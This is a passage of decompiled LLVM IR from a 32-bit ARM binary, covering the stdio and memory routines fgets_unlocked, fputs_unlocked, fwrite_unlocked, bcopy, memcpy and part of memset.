  store i32 92940, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_16b04.825 to i32), i32* %r1.global-to-local, align 4
  %v1_146b8 = call i32 @__pthread_return_void()
  %v0_146bc = load i32, i32* @r4, align 4
  store i32 %v0_146bc, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_16b04.825 to i32), i32* %r3.global-to-local, align 4
  %v1_146c8 = call i32 @__pthread_return_0()
  store i32 %v1_146c8, i32* %r0.global-to-local, align 4
  %v0_146cc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_146cc

dec_label_pc_146cc:                               ; preds = %dec_label_pc_14690, %dec_label_pc_146a0
  %v0_146e0 = phi i32 [ %v0_146a0, %dec_label_pc_14690 ], [ %v0_146cc.pre, %dec_label_pc_146a0 ]
  %v1_146cc = inttoptr i32 %v0_146e0 to i32*
  %v2_146cc = load i32, i32* %v1_146cc, align 4
  %v0_146d0 = load i32, i32* %sl.global-to-local, align 4
  %v2_146d0 = or i32 %v0_146d0, %v2_146cc
  %v1_146d4 = xor i32 %v2_146d0, 320
  store i32 %v1_146d4, i32* %r3.global-to-local, align 4
  %v1_146d8 = and i32 %v1_146d4, 832
  %v2_146d8 = icmp eq i32 %v1_146d8, 0
  store i1 %v2_146d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_146d8, label %dec_label_pc_146e0, label %bb39

dec_label_pc_146e0:                               ; preds = %dec_label_pc_146cc
  store i32 %v0_146e0, i32* @r0, align 4
  %v0_146e4 = call i32 @__stdio_wcommit()
  store i32 %v0_146e4, i32* %r0.global-to-local, align 4
  %v2_146e8 = icmp eq i32 %v0_146e4, 0
  store i1 %v2_146e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_146e8, label %.thread5, label %.thread7

.thread5:                                         ; preds = %dec_label_pc_146e0
  %v1_146ec = load i32, i32* @r6, align 4
  %v2_146ec = inttoptr i32 %v1_146ec to i32*
  %v3_146ec = load i32, i32* %v2_146ec, align 4
  store i32 %v3_146ec, i32* %r3.global-to-local, align 4
  %v2_146f0 = add i32 %v1_146ec, 8
  %v3_146f0 = inttoptr i32 %v2_146f0 to i32*
  %v4_146f0 = load i32, i32* %v3_146f0, align 4
  %v2_146f4 = and i32 %v3_146ec, -65
  store i32 %v2_146f4, i32* %r3.global-to-local, align 4
  %v4_146f8 = sdiv i32 %v3_146ec, 256
  store i32 %v4_146f8, i32* %r1.global-to-local, align 4
  %v3_146fc = add i32 %v1_146ec, 28
  %v4_146fc = inttoptr i32 %v3_146fc to i32*
  store i32 %v4_146f0, i32* %v4_146fc, align 4
  %v1_14700 = load i32, i32* %r1.global-to-local, align 4
  %v2_14700 = trunc i32 %v1_14700 to i8
  %v3_14700 = load i32, i32* @r6, align 4
  %v4_14700 = add i32 %v3_14700, 1
  %v5_14700 = inttoptr i32 %v4_14700 to i8*
  store i8 %v2_14700, i8* %v5_14700, align 1
  %v0_14704.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14704.pr.pr.pr, label %.thread6, label %.thread7

.thread6:                                         ; preds = %.thread5
  %v1_14704 = load i32, i32* %r3.global-to-local, align 4
  %v2_14704 = trunc i32 %v1_14704 to i8
  %v3_14704 = load i32, i32* @r6, align 4
  %v4_14704 = inttoptr i32 %v3_14704 to i8*
  store i8 %v2_14704, i8* %v4_14704, align 1
  %v0_14708.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14708.pr.pr.pr, label %bb39, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_146e0, %.thread5, %.thread6
  store i32 -1, i32* @r5, align 4
  br label %bb39

bb39:                                             ; preds = %dec_label_pc_146cc, %.thread6, %.thread7
  %v2_14710 = load i32, i32* @global_var_262a4.842, align 4
  store i32 %v2_14710, i32* %r3.global-to-local, align 4
  %v7_14714 = icmp eq i32 %v2_14710, 2
  store i1 %v7_14714, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14714, label %.thread11, label %bb40

bb40:                                             ; preds = %bb39
  store i32 %v2_145dc, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 92940, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 92940)
  br label %.thread11

.thread11:                                        ; preds = %bb39, %dec_label_pc_14684, %bb40
  %v0_1472c = load i32, i32* @r6, align 4
  %v1_1472c = add i32 %v0_1472c, 32
  %v2_1472c = inttoptr i32 %v1_1472c to i32*
  %v3_1472c = load i32, i32* %v2_1472c, align 4
  store i32 %v3_1472c, i32* @r6, align 4
  %v2_14730 = icmp eq i32 %v3_1472c, 0
  store i1 %v2_14730, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14730, label %dec_label_pc_14730.dec_label_pc_14738_crit_edge, label %dec_label_pc_14684

dec_label_pc_14730.dec_label_pc_14738_crit_edge:  ; preds = %.thread11
  %v0_14738.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14738

dec_label_pc_14738:                               ; preds = %dec_label_pc_14730.dec_label_pc_14738_crit_edge, %dec_label_pc_145f4
  %v0_14738 = phi i32 [ %v0_14738.pre, %dec_label_pc_14730.dec_label_pc_14738_crit_edge ], [ %v1_14674, %dec_label_pc_145f4 ]
  %v1_14738 = call i32 @_stdio_openlist_dec_use(i32 %v0_14738)
  store i32 %v1_14738, i32* %r0.global-to-local, align 4
  %v0_1477c.pre = load i32, i32* @r5, align 4
  br label %bb43

dec_label_pc_14740:                               ; preds = %dec_label_pc_145e8
  %v1_14740 = inttoptr i32 %.v1_145d4 to i8*
  %v2_14740 = load i8, i8* %v1_14740, align 1
  %v3_14740 = zext i8 %v2_14740 to i32
  %v1_14744 = and i32 %v3_14740, 64
  store i32 %v1_14744, i32* %r3.global-to-local, align 4
  %v2_14744 = icmp eq i32 %v1_14744, 0
  store i1 %v2_14744, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14744, label %bb41, label %dec_label_pc_14750

bb41:                                             ; preds = %dec_label_pc_14740
  br label %bb43

dec_label_pc_14750:                               ; preds = %dec_label_pc_14740
  %v0_14750 = call i32 @__stdio_wcommit()
  store i32 %v0_14750, i32* %r0.global-to-local, align 4
  %v2_14754 = icmp eq i32 %v0_14750, 0
  store i1 %v2_14754, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14754, label %.thread16, label %bb42

.thread16:                                        ; preds = %dec_label_pc_14750
  %v1_14758 = load i32, i32* %r8.global-to-local, align 4
  %v2_14758 = inttoptr i32 %v1_14758 to i32*
  %v3_14758 = load i32, i32* %v2_14758, align 4
  store i32 %v3_14758, i32* %r3.global-to-local, align 4
  %v2_1475c = add i32 %v1_14758, 8
  %v3_1475c = inttoptr i32 %v2_1475c to i32*
  %v4_1475c = load i32, i32* %v3_1475c, align 4
  store i32 %v4_1475c, i32* %r1.global-to-local, align 4
  %v2_14760 = and i32 %v3_14758, -65
  store i32 %v2_14760, i32* %r3.global-to-local, align 4
  %v4_14764 = sdiv i32 %v3_14758, 256
  %v2_14768 = trunc i32 %v4_14764 to i8
  %v4_14768 = add i32 %v1_14758, 1
  %v5_14768 = inttoptr i32 %v4_14768 to i8*
  store i8 %v2_14768, i8* %v5_14768, align 1
  %v0_1476c.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1476c.pr.pr.pr, label %.thread18, label %.thread21

.thread18:                                        ; preds = %.thread16
  %v1_1476c = load i32, i32* %r1.global-to-local, align 4
  %v2_1476c = load i32, i32* %r8.global-to-local, align 4
  %v3_1476c = add i32 %v2_1476c, 28
  %v4_1476c = inttoptr i32 %v3_1476c to i32*
  store i32 %v1_1476c, i32* %v4_1476c, align 4
  %v1_14770 = load i32, i32* %r3.global-to-local, align 4
  %v2_14770 = trunc i32 %v1_14770 to i8
  %v3_14770 = load i32, i32* %r8.global-to-local, align 4
  %v4_14770 = inttoptr i32 %v3_14770 to i8*
  store i8 %v2_14770, i8* %v4_14770, align 1
  %v0_14774.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14774.pr.pr.pr, label %.thread20, label %.thread21

.thread21:                                        ; preds = %.thread16, %.thread18
  br label %bb43

bb42:                                             ; preds = %dec_label_pc_14750
  br label %bb43

.thread20:                                        ; preds = %.thread18
  br label %bb43

bb43:                                             ; preds = %bb41, %bb42, %.thread21, %dec_label_pc_14738, %.thread20
  %v0_1477c = phi i32 [ -1, %.thread21 ], [ 0, %bb41 ], [ %v0_1477c.pre, %dec_label_pc_14738 ], [ -1, %bb42 ], [ 0, %.thread20 ]
  store i32 %v0_1477c, i32* %r0.global-to-local, align 4
  store i32 %v3_145c8, i32* @r4, align 4
  ret i32 %v0_1477c

; uselistorder directives
  uselistorder i32 %v0_1477c, { 1, 0 }
  uselistorder i32 %v3_1472c, { 1, 2, 0 }
  uselistorder i32 %v2_145dc, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 5, 9, 4, 10, 1, 6, 0, 7, 8 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 11, 4, 5, 6, 7, 8, 9, 10, 14, 12, 13 }
  uselistorder i32* bitcast (i32** @global_var_26270.851 to i32*), { 3, 0, 4, 1, 2, 5 }
  uselistorder i32* @global_var_2a5ec.831, { 1, 4, 2, 0, 5, 3, 6 }
  uselistorder label %bb43, { 4, 1, 2, 0, 3 }
  uselistorder label %.thread21, { 1, 0 }
  uselistorder label %.thread11, { 2, 0, 1 }
  uselistorder label %bb39, { 2, 1, 0 }
  uselistorder label %.thread7, { 2, 1, 0 }
  uselistorder label %dec_label_pc_146cc, { 1, 0 }
  uselistorder label %dec_label_pc_14684, { 1, 0 }
  uselistorder label %dec_label_pc_145f4, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_147b0 = icmp eq i32 %arg2, 0
  store i1 %v2_147b0, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp14 = icmp slt i32 %arg2, 1
  br i1 %tmp14, label %dec_label_pc_14838, label %dec_label_pc_1481c.preheader

dec_label_pc_1481c.preheader:                     ; preds = %entry
  store i32 %tmp, i32* @r4, align 4
  %v1_1481c15 = add i32 %arg2, -1
  store i32 %v1_1481c15, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_1481c21 = icmp eq i32 %arg2, 1
  store i1 %v7_1481c21, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1481c21, label %dec_label_pc_14828, label %dec_label_pc_147c8

dec_label_pc_147c8:                               ; preds = %dec_label_pc_1481c.preheader, %dec_label_pc_1481c.backedge
  %v1_1482024.in = phi i32 [ %v0_14820.pre, %dec_label_pc_1481c.backedge ], [ %arg3, %dec_label_pc_1481c.preheader ]
  %v1_147c8 = add i32 %v1_1482024.in, 16
  %v2_147c8 = inttoptr i32 %v1_147c8 to i32*
  %v3_147c8 = load i32, i32* %v2_147c8, align 4
  store i32 %v3_147c8, i32* %r2.global-to-local, align 4
  %v1_147cc = add i32 %v1_1482024.in, 24
  %v2_147cc = inttoptr i32 %v1_147cc to i32*
  %v3_147cc = load i32, i32* %v2_147cc, align 4
  %v3_147d0 = icmp uge i32 %v3_147c8, %v3_147cc
  store i1 %v3_147d0, i1* %cpsr_c.global-to-local, align 1
  %v9_147d0 = icmp eq i32 %v3_147c8, %v3_147cc
  store i1 %v9_147d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_147d0, label %dec_label_pc_147f0, label %dec_label_pc_147d8

dec_label_pc_147d8:                               ; preds = %dec_label_pc_147c8
  %v1_147d8 = inttoptr i32 %v3_147c8 to i8*
  %v2_147d8 = load i8, i8* %v1_147d8, align 1
  %v5_147d8 = add i32 %v3_147c8, 1
  store i32 %v5_147d8, i32* %r2.global-to-local, align 4
  %v2_147dc = load i32, i32* @r4, align 4
  %v3_147dc = inttoptr i32 %v2_147dc to i8*
  store i8 %v2_147d8, i8* %v3_147dc, align 1
  %v0_147e0 = load i32, i32* @r4, align 4
  %v1_147e0 = inttoptr i32 %v0_147e0 to i8*
  %v2_147e0 = load i8, i8* %v1_147e0, align 1
  %v5_147e0 = add i32 %v0_147e0, 1
  store i32 %v5_147e0, i32* @r4, align 4
  %v2_147e4 = icmp ugt i8 %v2_147e0, 9
  store i1 %v2_147e4, i1* %cpsr_c.global-to-local, align 1
  %v7_147e4 = icmp eq i8 %v2_147e0, 10
  store i1 %v7_147e4, i1* %cpsr_z.global-to-local, align 1
  %v0_147e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_147e8 = load i32, i32* @r5, align 4
  %v2_147e8 = add i32 %v1_147e8, 16
  %v3_147e8 = inttoptr i32 %v2_147e8 to i32*
  store i32 %v0_147e8, i32* %v3_147e8, align 4
  br i1 %v7_147e4, label %dec_label_pc_14828, label %dec_label_pc_1481c.backedge

dec_label_pc_147f0:                               ; preds = %dec_label_pc_147c8
  %v1_1482024 = inttoptr i32 %v1_1482024.in to i8*
  %v3_147f0 = call i32 @getc_unlocked(i8* %v1_1482024)
  %v4_147f0 = trunc i32 %v3_147f0 to i8
  %v5_147f4 = icmp eq i8 %v4_147f0, -1
  store i1 %v5_147f4, i1* %cpsr_c.global-to-local, align 1
  %v10_147f4 = icmp eq i32 %v3_147f0, -1
  store i1 %v10_147f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v5_147f4, label %dec_label_pc_147fc, label %dec_label_pc_14818

dec_label_pc_147fc:                               ; preds = %dec_label_pc_147f0
  %v0_147fc = load i32, i32* @r5, align 4
  %v1_147fc = inttoptr i32 %v0_147fc to i8*
  %v2_147fc = load i8, i8* %v1_147fc, align 1
  %v1_14800 = and i8 %v2_147fc, 8
  %v2_14800 = icmp eq i8 %v1_14800, 0
  store i1 %v2_14800, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14800, label %dec_label_pc_14828, label %dec_label_pc_14838

dec_label_pc_14818:                               ; preds = %dec_label_pc_147f0
  %v3_1480c = load i32, i32* @r4, align 4
  %v4_1480c = inttoptr i32 %v3_1480c to i8*
  store i8 %v4_147f0, i8* %v4_1480c, align 1
  %v0_14810 = load i32, i32* @r4, align 4
  %v1_14810 = inttoptr i32 %v0_14810 to i8*
  %v2_14810 = load i8, i8* %v1_14810, align 1
  %v5_14810 = add i32 %v0_14810, 1
  store i32 %v5_14810, i32* @r4, align 4
  %v2_14814 = icmp ugt i8 %v2_14810, 9
  store i1 %v2_14814, i1* %cpsr_c.global-to-local, align 1
  %v7_14814 = icmp eq i8 %v2_14810, 10
  store i1 %v7_14814, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14814, label %dec_label_pc_14828, label %dec_label_pc_1481c.backedge

dec_label_pc_1481c.backedge:                      ; preds = %dec_label_pc_14818, %dec_label_pc_147d8
  %v0_1481c.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_14820.pre = load i32, i32* @r5, align 4
  %v1_1481c = add i32 %v0_1481c.pre, -1
  store i32 %v1_1481c, i32* %r6.global-to-local, align 4
  %v2_1481c = icmp ne i32 %v0_1481c.pre, 0
  store i1 %v2_1481c, i1* %cpsr_c.global-to-local, align 1
  %v7_1481c = icmp eq i32 %v0_1481c.pre, 1
  store i1 %v7_1481c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1481c, label %dec_label_pc_14828, label %dec_label_pc_147c8

dec_label_pc_14828:                               ; preds = %dec_label_pc_1481c.preheader, %dec_label_pc_14818, %dec_label_pc_1481c.backedge, %dec_label_pc_147d8, %dec_label_pc_147fc
  %v0_14828 = load i32, i32* @r4, align 4
  %v1_14828 = load i32, i32* %r7.global-to-local, align 4
  %v3_14828 = icmp uge i32 %v0_14828, %v1_14828
  store i1 %v3_14828, i1* %cpsr_c.global-to-local, align 1
  %v9_14828 = icmp eq i32 %v0_14828, %v1_14828
  store i1 %v9_14828, i1* %cpsr_z.global-to-local, align 1
  %v2_1482c = xor i1 %v9_14828, true
  %v3_1482c = and i1 %v3_14828, %v2_1482c
  br i1 %v3_1482c, label %bb, label %.thread7

bb:                                               ; preds = %dec_label_pc_14828
  %v7_14830 = inttoptr i32 %v0_14828 to i8*
  store i8 0, i8* %v7_14830, align 1
  %v0_14834.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_14834.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_14828, %bb
  %v1_14834 = phi i1 [ %v1_14834.pre, %bb ], [ %v9_14828, %dec_label_pc_14828 ]
  %v0_14834 = phi i1 [ %v0_14834.pre, %bb ], [ %v3_14828, %dec_label_pc_14828 ]
  %v2_14834 = xor i1 %v1_14834, true
  %v3_14834 = and i1 %v0_14834, %v2_14834
  br i1 %v3_14834, label %.dec_label_pc_1483c_crit_edge, label %dec_label_pc_14838

.dec_label_pc_1483c_crit_edge:                    ; preds = %.thread7
  %v0_1483c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1483c

dec_label_pc_14838:                               ; preds = %entry, %dec_label_pc_147fc, %.thread7
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1483c

dec_label_pc_1483c:                               ; preds = %.dec_label_pc_1483c_crit_edge, %dec_label_pc_14838
  %v0_1483c = phi i32 [ %v0_1483c.pre, %.dec_label_pc_1483c_crit_edge ], [ 0, %dec_label_pc_14838 ]
  ret i32 %v0_1483c

; uselistorder directives
  uselistorder i1 %v9_14828, { 1, 0, 2 }
  uselistorder i32 %v1_14828, { 1, 0 }
  uselistorder i32 %v0_14828, { 0, 2, 1 }
  uselistorder i32 %v0_1481c.pre, { 2, 0, 1 }
  uselistorder i1 %v2_14800, { 1, 0 }
  uselistorder i32 %v3_147c8, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_1482024.in, { 2, 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 7, 2, 3, 4, 5, 6, 9, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 8, 7 }
  uselistorder i8 -1, { 1, 2, 3, 4, 0, 5 }
  uselistorder i8 9, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_1483c, { 1, 0 }
  uselistorder label %dec_label_pc_14838, { 2, 1, 0 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_14828, { 2, 1, 4, 3, 0 }
  uselistorder label %dec_label_pc_147c8, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_14844 = load i32, i32* @r4, align 4
  store i32 %v3_14844, i32* %stack_var_-16, align 4
  %v6_14844 = load i32, i32* @r5, align 4
  %v9_14844 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_14850 = call i32 @strlen(i8* %arg1)
  store i32 %v3_14850, i32* @r6, align 4
  %v0_14858 = load i32, i32* @r5, align 4
  %v0_1485c = load i32, i32* @r4, align 4
  %v5_14868 = inttoptr i32 %v0_14858 to i8*
  %v6_14868 = call i32 @__GI_fwrite_unlocked(i32 %v0_1485c, i32 1, i32 %v3_14850, i8* %v5_14868)
  %v1_1486c = load i32, i32* @r6, align 4
  %v9_1486c = icmp eq i32 %v6_14868, %v1_1486c
  br i1 %v9_1486c, label %bb7, label %bb

bb:                                               ; preds = %entry
  br label %bb7

bb7:                                              ; preds = %entry, %bb
  %v14_14874 = phi i32 [ %v6_14868, %entry ], [ -1, %bb ]
  %v2_14874 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14874, i32* @r4, align 4
  store i32 %v6_14844, i32* @r5, align 4
  store i32 %v9_14844, i32* @r6, align 4
  ret i32 %v14_14874

; uselistorder directives
  uselistorder label %bb7, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v9_14878 = load i32, i32* @r6, align 4
  %v12_14878 = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_14880 = load i8, i8* %arg4, align 1
  %v4_14880 = zext i8 %v3_14880 to i32
  %v1_14884 = and i32 %v4_14880, 192
  store i32 %v1_14884, i32* %r3.global-to-local, align 4
  %v2_14888 = icmp eq i32 %v1_14884, 192
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg3, i32* @r6, align 4
  br i1 %v2_14888, label %dec_label_pc_148b0, label %dec_label_pc_148a4

dec_label_pc_148a4:                               ; preds = %entry
  %v4_148a4 = call i32 @__stdio_trans2w_o(i8* nonnull %arg4, i32 128)
  %v2_148a8 = icmp eq i32 %v4_148a4, 0
  br i1 %v2_148a8, label %dec_label_pc_148a4.dec_label_pc_148b0_crit_edge, label %dec_label_pc_14918

dec_label_pc_148a4.dec_label_pc_148b0_crit_edge:  ; preds = %dec_label_pc_148a4
  %v0_148b0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_148b0

dec_label_pc_148b0:                               ; preds = %dec_label_pc_148a4.dec_label_pc_148b0_crit_edge, %entry
  %v0_148b81 = phi i32 [ %v0_148b0.pre, %dec_label_pc_148a4.dec_label_pc_148b0_crit_edge ], [ %arg2, %entry ]
  %v2_148b0 = icmp eq i32 %v0_148b81, 0
  br i1 %v2_148b0, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_148b0
  br label %dec_label_pc_14918

bb:                                               ; preds = %dec_label_pc_148b0
  %v1_148b4 = load i32, i32* @r6, align 4
  %v3_148b4 = icmp eq i32 %v1_148b4, 0
  br i1 %v3_148b4, label %dec_label_pc_14918, label %dec_label_pc_148c4

dec_label_pc_148c4:                               ; preds = %bb
  %v2_148c4 = udiv i32 -1, %v0_148b81
  %v0_148cc = load i32, i32* @r4, align 4
  store i32 %v0_148cc, i32* %r2.global-to-local, align 4
  %tmp10 = icmp ugt i32 %v1_148b4, %v2_148c4
  br i1 %tmp10, label %dec_label_pc_148f0, label %dec_label_pc_148d8

dec_label_pc_148d8:                               ; preds = %dec_label_pc_148c4
  %v0_148d0 = load i32, i32* @r7, align 4
  %v2_148d8 = mul i32 %v1_148b4, %v0_148b81
  %v4_148dc = call i32 @__stdio_fwrite(i32 %v0_148d0, i32 %v2_148d8, i32 %v0_148cc)
  %v0_148e0 = load i32, i32* @r5, align 4
  %v2_148e4 = udiv i32 %v4_148dc, %v0_148e0
  store i32 %v2_148e4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1491c

dec_label_pc_148f0:                               ; preds = %dec_label_pc_148c4
  %v1_148f0 = inttoptr i32 %v0_148cc to i32*
  %v2_148f0 = load i32, i32* %v1_148f0, align 4
  %v1_148f4 = or i32 %v2_148f0, 8
  store i32 %v1_148f4, i32* %r3.global-to-local, align 4
  %v3_148f8 = sdiv i32 %v2_148f0, 256
  store i32 %v3_148f8, i32* %r2.global-to-local, align 4
  %v1_148fc = trunc i32 %v3_148f8 to i8
  %v3_148fc = add i32 %v0_148cc, 1
  %v4_148fc = inttoptr i32 %v3_148fc to i8*
  store i8 %v1_148fc, i8* %v4_148fc, align 1
  %v0_14900 = load i32, i32* %r3.global-to-local, align 4
  %v1_14900 = trunc i32 %v0_14900 to i8
  %v2_14900 = load i32, i32* @r4, align 4
  %v3_14900 = inttoptr i32 %v2_14900 to i8*
  store i8 %v1_14900, i8* %v3_14900, align 1
  %v0_14904 = call i32 @__errno_location()
  store i32 22, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_14910 = inttoptr i32 %v0_14904 to i32*
  store i32 22, i32* %v2_14910, align 4
  %v0_1491c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1491c

dec_label_pc_14918:                               ; preds = %.thread, %dec_label_pc_148a4, %bb
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1491c

dec_label_pc_1491c:                               ; preds = %dec_label_pc_148f0, %dec_label_pc_148d8, %dec_label_pc_14918
  %v0_1491c = phi i32 [ %v0_1491c.pre, %dec_label_pc_148f0 ], [ %v2_148e4, %dec_label_pc_148d8 ], [ 0, %dec_label_pc_14918 ]
  store i32 %v9_14878, i32* @r6, align 4
  store i32 %v12_14878, i32* @r7, align 4
  ret i32 %v0_1491c

; uselistorder directives
  uselistorder i32 %v3_148f8, { 1, 0 }
  uselistorder i32 %v1_148b4, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 (i32, i32, i32)* @__stdio_fwrite, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1491c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14918, { 2, 0, 1 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_1493c = inttoptr i32 %arg2 to i8*
  %v3_1493c = call i32 @_memcpy(i8* %v2_1493c, i32 %arg1)
  ret i32 %v3_1493c
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_14940 = load i32, i32* @r0, align 4
  %v1_14940 = load i32, i32* @r1, align 4
  %v2_14940 = inttoptr i32 %v0_14940 to i8*
  %v3_14940 = call i32 @_memcpy(i8* %v2_14940, i32 %v1_14940)
  ret i32 %v3_14940
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_14954 = load i32, i32* @r2, align 4
  %v8_14954 = icmp eq i32 %v0_14954, 8
  store i1 %v8_14954, i1* %cpsr_z.global-to-local, align 1
  %v5_14958 = icmp slt i32 %v0_14954, 8
  br i1 %v5_14958, label %dec_label_pc_149b8, label %dec_label_pc_1495c

dec_label_pc_1495c:                               ; preds = %entry
  %v4_1495c = mul i32 %arg2, 256
  %v5_1495c = or i32 %v4_1495c, %arg2
  %v4_14960 = mul i32 %v5_1495c, 65536
  %v5_14960 = or i32 %v4_14960, %v5_1495c
  store i32 %v5_14960, i32* %r1.global-to-local, align 4
  %v1_1496457 = urem i32 %tmp, 4
  %v2_1496458 = icmp eq i32 %v1_1496457, 0
  store i1 %v2_1496458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_1496458, label %dec_label_pc_14974, label %bb

bb:                                               ; preds = %dec_label_pc_1495c, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_1495c ]
  %v3_1496859 = phi i32 [ %v6_14968, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_1495c ]
  %v4_14968 = inttoptr i32 %v3_1496859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_14968, align 1
  %v5_14968 = load i32, i32* %r3.global-to-local, align 4
  %v6_14968 = add i32 %v5_14968, 1
  store i32 %v6_14968, i32* %r3.global-to-local, align 4
  %v0_1496c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_14978.pr.pre = load i32, i32* @r2, align 4
  br i1 %v0_1496c.pr, label %dec_label_pc_14974, label %.thread

.thread:                                          ; preds = %bb
  %v2_1496c = add i32 %v0_14978.pr.pre, -1
  store i32 %v2_1496c, i32* @r2, align 4
  %v1_14964 = urem i32 %v6_14968, 4
  %v2_14964 = icmp eq i32 %v1_14964, 0
  store i1 %v2_14964, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14964, label %dec_label_pc_14974, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_14968.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t82 = trunc i32 %v1_14968.pre to i8
  br label %bb

dec_label_pc_14974:                               ; preds = %.thread, %bb, %dec_label_pc_1495c
  %v0_1498028 = phi i32 [ %tmp, %dec_label_pc_1495c ], [ %v6_14968, %bb ], [ %v6_14968, %.thread ]
